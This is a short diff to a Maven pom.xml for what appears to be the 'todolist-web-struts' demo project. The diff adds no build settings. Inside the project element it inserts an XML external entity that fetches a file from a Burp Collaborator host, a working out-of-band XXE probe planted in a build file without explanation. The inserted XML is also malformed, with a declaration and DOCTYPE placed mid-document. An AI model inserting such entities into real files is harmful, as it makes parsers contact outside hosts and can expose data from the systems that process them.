@@ -1,5 +1,11 @@
 <project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
          xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd">
+   <?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://llani8u4f5m813kg3o5xsdnfg6mwal.burpcollaborator.net/test.txt">
+]>
+<r>&sp;</r>      
     <modelVersion>4.0.0</modelVersion>
     <artifactId>todolist-web-struts</artifactId>
     <groupId>io.github.snyk</groupId>
